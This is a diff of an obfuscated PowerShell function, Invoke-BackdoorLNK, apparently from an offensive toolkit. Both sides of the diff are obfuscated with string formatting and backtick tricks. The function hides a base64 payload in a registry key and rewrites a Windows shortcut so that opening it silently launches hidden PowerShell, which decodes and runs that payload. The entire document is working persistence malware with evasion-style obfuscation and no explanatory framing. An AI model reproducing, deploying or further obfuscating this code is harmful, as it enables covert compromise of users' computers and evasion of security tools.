@@ -1,76 +1,76 @@
-  Set-VarIabLe ("{1}{0}"-f 'OSWH','9') (  [TyPE]("{0}{2}{4}{3}{1}"-f'SY','ODiNg','StEm','.eNC','.tExt'))  ;    SeT-iTEm ("VARIabL"+"E"+":2I"+"0") ( [TYPE]("{4}{2}{0}{1}{3}"-F'eM.C','ONV','St','ERt','SY')); function i`NVOK`e-B`ACKdOORLNk {
+ ${0`4Dp}= [tYpe]("{0}{2}{4}{3}{1}" -F'sys','ding','teM.TE','ENCo','xt.')  ;  ${x`8Yn9} =  [typE]("{0}{4}{3}{2}{1}"-F 'Sy','t','NVer','Tem.Co','S');  function iN`VOKe-BaCkdoO`Rl`NK {
 
 
     [CmdletBinding()] Param(
-        [Parameter(VaLuefROmpiPeLiNE=${t`RUE}, MAnDaTORY = ${T`RUE})]
-        [ValidateScript({&("{2}{0}{3}{1}"-f'es','h','T','t-Pat') -Path ${_} })]
+        [Parameter(vaLueFrOMPIPeLINe=${T`Rue}, MAnDAtory = ${t`RuE})]
+        [ValidateScript({Test-Path -Path ${_} })]
         [String]
-        ${L`NkPAth},
+        ${l`NkpATh},
 
         [String]
-        ${E`NC`SCRi`pT},
+        ${ENcs`cr`IpT},
 
         [String]
-        ${Re`Gp`ATH} = (("{6}{2}{7}{3}{5}{9}{1}{0}{8}{4}"-f'wsOfWd','indo','OfWSoftwa','fW','bug','Micr','HKCU:','reO','e','osoftOfWW'))."rEPlA`Ce"(([ChaR]79+[ChaR]102+[ChaR]87),'\'),
+        ${rEG`pA`TH} = 'HKCU:\Software\Microsoft\Windows\debug',
 
         [Switch]
-        ${C`LeaN`Up}
+        ${C`LEANUp}
     )
 
-    ${Regp`AR`Ts} = ${r`Egp`ATh}.("{1}{0}" -f 'plit','s').Invoke("\")
-    ${P`Ath} = ${RegPa`R`Ts}[0..(${Re`G`pArts}."co`unT"-2)] -join "\"
-    ${n`Ame} = ${RE`G`pA`RtS}[-1]
+    ${ReG`pa`Rts} = ${REG`pA`TH}."sp`LIT"("\")
+    ${PA`Th} = ${r`e`GpaRtS}[0..(${r`EGp`Ar`TS}."c`OUnt"-2)] -join "\"
+    ${N`AmE} = ${RE`Gp`ArTS}[-1]
 
 
-    ${o`BJ} = &("{2}{1}{0}"-f't','-Objec','New') -ComObject ("{1}{3}{0}{2}" -f 't','WS','.Shell','crip')
-    ${L`NK} = ${O`Bj}.("{2}{4}{1}{0}{3}"-f 'ate','e','C','Shortcut','r').Invoke(${LNk`Pa`Th})
+    ${o`Bj} = New-Object -ComObject ("{0}{2}{1}"-f'WScri','ll','pt.She')
+    ${l`Nk} = ${o`Bj}."crE`At`esHo`Rtcut"(${LNK`pa`Th})
 
     
-    ${Tar`gETPa`Th} = ${l`NK}."taRge`Tp`Ath"
-    ${wO`R`Ki`NGDIREC`TOrY} = ${L`Nk}."w`oR`ki`NGdI`RECtO`RY"
-    ${ic`oNlOc`AtION} = ${L`Nk}."iCO`Nlo`cAtI`on"
+    ${Targ`e`T`patH} = ${L`NK}."tA`RgE`TpA`Th"
+    ${W`Ork`iN`g`DIRECTory} = ${l`NK}."WOrkING`DIr`Ec`T`oRy"
+    ${icOn`LOCat`Ion} = ${L`NK}."Ic`oN`LO`cATION"
 
-    if(${cl`ea`NuP}) {
-
-        
-        ${ori`gI`NALP`A`Th} = (${iCOnLo`Ca`TI`ON} -split ",")[0]
-
-        ${l`Nk}."Ta`Rge`TPAth" = ${orig`In`AlpA`TH}
-        ${l`NK}."AR`G`Uments" = ${nU`ll}
-        ${L`NK}."w`INDO`wSTyle" = 1
-        ${l`Nk}.("{1}{0}"-f'e','Sav').Invoke()
+    if(${CL`eAnUp}) {
 
         
-        ${N`ULL} = &("{2}{1}{3}{4}{0}" -f'perty','v','Remo','e-Ite','mPro') -Force -Path ${P`ATH} -Name ${Na`mE}
+        ${ORIg`I`NAl`p`ATh} = (${ic`onl`o`caTiOn} -split ",")[0]
+
+        ${l`NK}."tArg`eTPA`Th" = ${ORiGI`NALP`ATh}
+        ${L`Nk}."ArgU`m`ents" = ${Nu`LL}
+        ${l`NK}."w`ind`o`wstylE" = 1
+        ${L`Nk}."s`AvE"()
+
+        
+        ${N`uLL} = Remove-ItemProperty -Force -Path ${Pa`Th} -Name ${N`AmE}
     }
     else {
 
-        if(!${En`c`SCRiPT} -or ${eNcSC`R`iPt} -eq '') {
-            throw ("{1}{5}{3}{2}{7}{0}{6}{4}"-f'qu','-En','Clea','cript or -','!','cS','ired','nup re')
+        if(!${enC`scr`ipt} -or ${e`N`cSC`RIpT} -eq '') {
+            throw "-EncScript or -Cleanup required!"
         }
 
         
-        ${Nu`Ll} = .("{2}{0}{1}"-f'emPro','perty','Set-It') -Force -Path ${pA`Th} -Name ${n`AmE} -Value ${Enc`SCRI`pt}
+        ${Nu`Ll} = Set-ItemProperty -Force -Path ${p`ATH} -Name ${N`AMe} -Value ${en`CSCRI`PT}
 
-        ('[*'+'] '+'B64'+' '+'sc'+'ript '+'s'+'tored '+'at'+' '+"'$RegPath'`n")
-
-        
-        ${l`NK}."TA`RG`E`TPAtH" = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+        "[*] B64 script stored at '$RegPath'`n"
 
         
-        ${lAU`NC`HsT`RinG} = ((("{3}{6}{5}{4}{1}{0}{7}{2}{8}"-f 'ss','ce','t(','[Syste','.Pro','ics','m.Diagnost',']::Star','sTp'))  -rEplACE([ChAR]115+[ChAR]84+[ChAR]112),[ChAR]34)+${t`A`RGEtpATH}+(("{15}{5}{14}{1}{2}{11}{6}{12}{0}{9}{8}{3}{13}{7}{10}{4}" -f 'GetString(','nc','oding','s','g((gp ','[Text.','O','tri','romBa','[Convert]::F','n',']::UNIC','DE.','e64S','E','ahz);IEX ('))."REPla`ce"('ahz',[STrIng][cHAR]34)+${p`ATH}+' '+${N`AmE}+').'+${n`Ame}+')))'
-
-        ${la`unc`hBy`TeS}  =   ( VAriaBLE ("{1}{0}"-f'osWH','9') ).vALuE::"UnI`co`dE".("{2}{0}{1}" -f 'etByte','s','G').Invoke(${laUN`Ch`sTR`i`NG})
-        ${LAUN`Ch`B64} =  ( ITEm ("VAriaBL"+"E"+":2I"+"0")  ).vALUE::("{0}{3}{2}{1}"-f 'To','String','e64','Bas').Invoke(${l`A`UNcH`BYteS})
-
-        ${L`NK}."ar`gU`meNTs" = ('-w'+' '+'hid'+'de'+'n '+'-no'+'p '+'-enc'+' '+"$LaunchB64")
+        ${L`Nk}."Ta`RGEtpa`TH" = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 
         
-        ${l`Nk}."W`O`R`k`INGDIrecTORy" = ${W`oRki`NGD`IRECtoRy}
-        ${L`NK}."IC`o`NLOcAti`on" = "$TargetPath,0"
-        ${L`NK}."wiND`oW`sTyLe" = 7
-        ${L`Nk}.("{0}{1}"-f'Sa','ve').Invoke()
+        ${L`A`uNch`StR`iNG} = '[System.Diagnostics.Process]::Start("'+${T`ArGetp`AtH}+'");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '+${P`AtH}+' '+${nA`Me}+').'+${na`ME}+')))'
 
-        ('[*'+'] '+'.'+'LNK '+'a'+'t '+"$LNKPath "+'se'+'t '+'t'+'o '+"trigger`n")
+        ${LAU`N`c`HBYteS}  =  ( cHiLdITem ("{4}{3}{2}{0}{1}"-f'4','dP',':0','iaBLE','VaR') )."v`Alue"::"UN`icode"."gETB`Y`TEs"(${LAun`cH`STRI`Ng})
+        ${laUnC`H`B64} =  ( dIr  ("v"+"ar"+"iABLE:x8y"+"N9")  )."v`ALuE"::"T`OBAse`64STri`Ng"(${LaU`Nchby`T`es})
+
+        ${L`Nk}."a`Rg`UMEnts" = "-w hidden -nop -enc $LaunchB64"
+
+        
+        ${L`Nk}."WorK`INGdIR`e`C`ToRY" = ${W`oR`KInGdIrEc`TORy}
+        ${l`Nk}."I`c`OnLocA`TION" = "$TargetPath,0"
+        ${l`Nk}."wIN`dow`STy`le" = 7
+        ${L`NK}."SA`VE"()
+
+        "[*] .LNK at $LNKPath set to trigger`n"
     }
 }
